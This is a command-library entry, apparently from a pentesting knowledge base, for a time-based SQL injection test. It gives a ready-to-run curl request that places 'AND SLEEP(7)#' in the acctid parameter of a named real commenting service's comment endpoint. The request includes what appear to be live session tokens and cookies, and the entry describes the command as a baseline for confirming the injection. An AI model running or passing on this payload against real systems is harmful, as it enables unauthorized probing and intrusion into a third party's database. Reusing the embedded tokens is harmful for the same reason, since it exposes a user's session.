---
id: cmd-sqli-sleep7-2024
data: >-
  curl -X GET
  "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\",
  \"params\": {\"firstCall\":true, \"src\":0, \"blogpostid\":504704482,
  \"acctid\":\"251219 AND SLEEP(7)#\", \"parentid\":\"0\", \"depth\":\"0\",
  \"type\":\"1\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",
  \"anonName\":\"\", \"anonEmail\":\"X\", \"anonURL\":\"\",
  \"userid\":\"26745290\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",
  \"mblid\":\"1\", \"tweetThis\":\"F\", \"subscribeThis\":\"1\",
  \"comment\":\"w\"}}" -H "Host: www.intensedebate.com" -H "User-Agent:
  Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0"
  -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H
  "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer:
  https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves"
  -H "Cookie: login_pref=IDC; idcomments_userid=26745290;
  idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848;
  country_code=FR; IDNewThreadComment=w"
tags:
  - sqli
  - baseline
type: command
output: HTTP response with shorter delay (~660ms)
executor: bash
platforms:
  - Linux
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.423Z'
verified: false
validated: true
submitted: true
---
# time-based-sqli-sleep-7

## Command

```bash
curl -X GET "https://www.intensedebate.com/js/commentAction/?data={\"request_type\":\"0\", \"params\": {\"firstCall\":true, \"src\":0, \"blogpostid\":504704482, \"acctid\":\"251219 AND SLEEP(7)#\", \"parentid\":\"0\", \"depth\":\"0\", \"type\":\"1\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\", \"anonName\":\"\", \"anonEmail\":\"X\", \"anonURL\":\"\", \"userid\":\"26745290\", \"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\", \"mblid\":\"1\", \"tweetThis\":\"F\", \"subscribeThis\":\"1\", \"comment\":\"w\"}}" -H "Host: www.intensedebate.com" -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0" -H "Accept: */*" -H "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Connection: close" -H "Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves" -H "Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w"
```

## Description

Similar to the SLEEP(15) command, this uses SLEEP(7) for a baseline comparison in time-based SQLi testing on the acctid parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method | Yes |
| `data=...` | JSON with SLEEP(7) payload | Yes |
| Headers | Mimic browser request | Yes |

## Examples

### Basic Usage

```bash
curl ... (full command)
```

### With Timing

```bash
curl ... -w "%{time_total}s\n"
```

## Expected Output

HTTP response with total time around 0.66 seconds.

## Related

- [[commands/time-based-sqli-sleep-15]]
- [[procedures/Confirm-SQL-Injection-with-Response-Times]]
